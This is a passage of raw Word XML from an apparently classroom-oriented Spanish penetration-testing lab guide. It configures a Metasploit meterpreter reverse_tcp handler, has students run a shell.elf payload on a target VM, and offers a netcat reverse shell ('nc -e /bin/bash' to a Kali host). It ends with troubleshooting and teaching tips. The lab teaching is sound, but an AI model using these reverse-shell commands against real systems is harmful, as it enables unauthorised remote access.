          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>exploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>/multi/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>handler</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2DFB6BC4" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">set PAYLOAD </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>linux</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>/x64/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">    # o </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>linux</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>/x86/... según lo que generaste</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21620024" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>set LHOST 192.168.56.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47AC38EC" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>set LPORT 4444</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35109964" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">set </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>ExitOnSession</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> false</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58D95B22" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">run -j   # ejecuta en </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>background</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>jobs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">) para poder seguir usando </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2589FDF8" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Paso 3: en la VM objetivo</w:t>
      </w:r>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Copia el </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>shell.elf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> a la VM (SCP, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>shared</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> folder, etc.), dale permisos y ejecútalo:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39E0EC09" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:lastRenderedPageBreak/>
        <w:t>chmod</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t xml:space="preserve"> +x </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t>shell.elf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="04CBE00D" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:r w:rsidRPr="00E149BA">
        <w:t>./</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t>shell.elf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1C5F10D7" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Resultado esperado:</w:t>
      </w:r>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> en </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> verás una sesión </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> abierta (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> -i &lt;id&gt; para interactuar). Si no aparece, comprueba: LHOST (dirección accesible desde la víctima), LPORT, firewall, arquitectura del binario y permisos.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0615D1D7" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">Alternativa simple (sin </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> generar un reverse </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>netcat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> para pruebas:</w:t>
      </w:r>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">En la víctima (si tiene </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>nc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E1FCE65" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>nc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> -e /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>bin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> 192.168.56.1 4444</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="753DAF63" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Y en Kali:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A7E59BB" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>nc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>lvnp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> 4444</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C454302" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00000000" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:pict w14:anchorId="5B7F9236">
          <v:rect id="_x0000_i1030" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="48288908" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>4) Fallos comunes y soluciones rápidas</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="561DC18F" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> no arranca o módulos faltan:</w:t>
      </w:r>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> sudo </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>msfdb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>init</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> y actualizar sudo </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>apt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>update</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> &amp;&amp; sudo </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>apt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>install</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>metasploit-framework</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E9779FE" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Listener</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> no recibe sesiones:</w:t>
      </w:r>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> revisar que LHOST sea la IP de Kali visible por la víctima (no 127.0.0.1), y que no haya firewall bloqueando el puerto.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="242FE675" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Payload</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> no ejecuta:</w:t>
      </w:r>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> comprobar arquitectura (x86 vs x64), permisos </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>chmod</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> +x, y dependencias en la VM.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CA8E088" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Exploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> falla:</w:t>
      </w:r>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> verificar que la versión del servicio sea la vulnerable (p. ej. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>vsftpd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2.3.4). Usa </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>sV</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> o banner </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>grab</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> para confirmar versión.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55BAACED" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00000000" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:pict w14:anchorId="48190379">
          <v:rect id="_x0000_i1031" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="7588F309" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>5) Sugerencias para clase / documentación</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21E0928A" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">Pide a los alumnos que </w:t>
      </w:r>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>documenten cada comando</w:t>
      </w:r>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> y que hagan capturas de pantalla de:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F626BC2" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>salida del escaneo,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DCCD116" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">configuración del </w:t>
      </w:r>
